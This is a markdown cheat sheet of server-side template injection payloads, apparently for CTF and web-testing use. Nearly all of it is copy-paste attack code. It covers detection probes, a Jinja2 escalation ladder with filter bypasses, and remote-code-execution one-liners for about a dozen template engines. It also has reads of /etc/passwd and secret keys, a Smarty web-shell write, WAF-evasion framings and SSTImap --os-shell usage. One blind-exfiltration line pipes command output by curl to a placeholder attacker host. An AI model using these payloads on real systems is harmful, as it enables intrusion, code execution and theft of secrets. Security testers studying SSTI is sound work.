---
title: "SSTI Payloads - Detection Matrix and Per-Engine RCE Ladder"
category: web
subcategory: ssti
type: cheatsheet
tags: [ssti, template-injection, jinja2, twig, freemarker, velocity, thymeleaf, erb, handlebars, pug, mako, tornado, smarty, nunjucks, ejs, polyglot, rce, lipsum, subclasses, mro]
summary: "Copy-paste SSTI detection probes per engine plus the full Jinja2 escalation ladder (globals, no-dot, no-underscore, no-quote, no-brace) and every other engine's RCE one-liner."
tools: [tplmap, sstimap, burp]
related: [ssti-jinja2, ssti-other-engines]
---

## Detection: polyglot + math ladder

```
# polyglot -- invalid in every engine, error names the engine
${{<%[%'"}}%\

# math probes -- see which renders
{{7*7}}            # Jinja2, Twig, Nunjucks -> 49
{{7*'7'}}          # Jinja2 -> 7777777 ; Twig/Nunjucks -> 49
${7*7}             # Freemarker, Thymeleaf, Mako, JSP EL -> 49
#{7*7}             # Pug, Ruby-interp, Slim -> 49
<%= 7*7 %>         # ERB, EJS, JSP scriptlet -> 49
#set($x=7*7)$x     # Velocity -> 49
{7*7}              # Smarty -> 49
{{7|add:7}}        # Django DTL -> 14
@(7*7)             # Razor -> 49
{{= 7*7 }}         # doT -> 49
```

## Engine fingerprints

```
{{_self}}                       # Twig  -> Twig\Template...
{{self}}                        # Jinja2 -> <TemplateReference None>
{{config}}                      # Jinja2/Flask -> Config object (leaks SECRET_KEY)
${.version}                     # Freemarker -> version string
{$smarty.version}               # Smarty -> version
{{constructor.constructor('return 1')()}}   # a JS engine (Handlebars/Nunjucks)
{{7|add:7}}                     # Django DTL
{{handler.settings}}            # Tornado -> leaks cookie_secret
```

## Jinja2 escalation ladder

### L0 orient

```jinja
{{7*7}}
{{7*'7'}}
{{config}}
{{config.items()}}
{{self.__init__.__globals__.__builtins__}}
{{request.application.__globals__}}
```

### L1 shortest RCE (Flask globals)

```jinja
{{lipsum.__globals__.os.popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('id').read()}}
{{namespace.__init__.__globals__.os.popen('id').read()}}
{{url_for.__globals__.os.popen('id').read()}}
{{get_flashed_messages.__globals__.os.popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{lipsum.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
```

### L2 pure MRO (no Flask globals)

```jinja
{{''.__class__.__mro__[1].__subclasses__()}}
{% for c in ''.__class__.__mro__[1].__subclasses__() %}{% if c.__name__=='Popen' %}{{c('id',shell=True,stdout=-1).communicate()[0]}}{% endif %}{% endfor %}
{{''.__class__.__mro__[1].__subclasses__()[NNN].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
```

### L3 __class__ / __ blacklisted

```jinja
{{''|attr('__class'+'__')}}
{{''|attr(request.args.c)}}                         &c=__class__
{{request|attr((request.args.a|string)+(request.args.b|string))}}   &a=__cla&b=ss__
{{()|attr("\x5f\x5fclass\x5f\x5f")}}
{{''['\x5f\x5fclass\x5f\x5f']}}
{{()|attr(request.args.c)|attr(request.args.b)|first|attr(request.args.s)()}}
```

### L4 no dots

```jinja
{{ ''['__class__']['__mro__'][1]['__subclasses__']() }}
{{ lipsum['__globals__']['os']['popen']('id')['read']() }}
{{ request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']() }}
```

### L5 no quotes (everything from request.args or dict()|list|join)

```jinja
{{lipsum[request.args.g][request.args.o][request.args.p](request.args.cmd)[request.args.r]()}}
&g=__globals__&o=os&p=popen&cmd=id&r=read

{{ (dict(a=1)|list|first) }}                # -> 'a'
{{ (dict(po=1,pen=1)|list|join) }}          # -> 'popen'
{{ lipsum|attr(dict(__glob=1,als__=1)|list|join) }}
```

### L6 no braces {{ }}

```jinja
{%print(lipsum.__globals__.os.popen('id').read())%}
{%if lipsum.__globals__.os.popen('id').read()%}yes{%endif%}
{% set x=lipsum.__globals__.os %}{%print x.popen('id').read()%}
```

### L7 blind / OOB

```jinja
{%print(lipsum.__globals__.os.popen('curl http://ATTACKER/`id|base64 -w0`').read())%}
{{lipsum.__globals__.os.popen('sleep 7').read()}}
{{lipsum.__globals__['__builtins__'].open('/app/static/p.txt','w').write(lipsum.__globals__.os.popen('id').read())}}
```

### L8 read-only (flag without RCE)

```jinja
{{config}}
{{config.SECRET_KEY}}
{{lipsum.__globals__['__builtins__'].open('/flag').read()}}
{{request.environ}}
```

## Other engines -- RCE one-liners

### Twig (PHP)

```twig
{{['id']|filter('system')}}
{{['id',0]|sort('system')|join}}
{{['id']|map('system')|join}}
{{[0,0]|reduce('system','id')}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{include('/etc/passwd')}}
{{source('/etc/passwd')}}
{{dump(app)}}
```

### Smarty (PHP)

```smarty
{php}system('id');{/php}
{system('id')}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET[0]); ?>",self::clearConfig())}
{$smarty.version}
{include file='/etc/passwd'}
```

### Freemarker (Java)

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("cat /flag")}
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id")}
<#assign jc="freemarker.template.utility.JythonRuntime"?new()><@jc>import os;os.system("id")</@jc>
```

### Velocity (Java)

```velocity
#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")
```

### Thymeleaf (Java/Spring)

```
${T(java.lang.Runtime).getRuntime().exec('id')}
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).next()}
```

### ERB / Ruby

```erb
<%= `id` %>
<%= system('id') %>
<%= IO.popen('id').readlines() %>
<%= File.read('/flag') %>
<%= ENV.to_h %>
```

### Handlebars (JS)

```handlebars
{{#with "s" as |string|}}{{#with "e"}}{{#with split as |c|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |code|}}{{this.pop}}{{this.push "return require('child_process').execSync('id');"}}{{this.pop}}{{#each c}}{{#with (string.sub.apply 0 code)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
```

### Pug / Jade (JS)

```pug
#{root.process.mainModule.require('child_process').execSync('id')}
#{global.process.mainModule.require('child_process').execSync('id')}
= process.mainModule.require('child_process').execSync('id')
```

### Nunjucks (JS)

```nunjucks
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
{{range.constructor("return global.process.env")()}}
```

### EJS (JS)

```ejs
<%= process.mainModule.require('child_process').execSync('id') %>
<%- global.process.mainModule.require('child_process').execSync('id') %>
```

### doT (JS)

```
{{= process.mainModule.require('child_process').execSync('id') }}
```

### Mako (Python)

```mako
${self.module.cache.util.os.system("id")}
<%import os%>${os.system('id')}
${__import__('os').popen('id').read()}
${open('/flag').read()}
```

### Tornado (Python)

```
{% import os %}{{os.system('id')}}
{% import subprocess %}{{subprocess.check_output('id',shell=True)}}
{{handler.settings}}
```

### Django DTL (info leak only)

```django
{% debug %}
{{settings.SECRET_KEY}}
{{request.META}}
{% include request.GET.f %}
```

### Go text/template

```
{{.}}
{{printf "%s" .}}
{{call .Somefunc "id"}}
```

## WAF-friendly framing

```
{{ 7*7 }}                    # whitespace inside delimiters is ignored
{{- 7*7 -}}                  # whitespace-control (Jinja2/Twig)
{{{{7*7}}}}                  # survives one .replace('{{','')
{{7*7}}}}                    # trailing junk survives naive strip
```

## Tools

```sh
python3 SSTImap.py -u 'http://host/?name=*' --os-shell
tplmap.py -u 'http://host/?name=*'
# quick local render check for Jinja2:
python3 -c "import jinja2;print(jinja2.Template(open('p.j2').read()).render())"
```

## References

- PortSwigger Web Security Academy -- SSTI labs.
- PayloadsAllTheThings -- Server Side Template Injection.
- Hacktricks -- SSTI engine matrix.
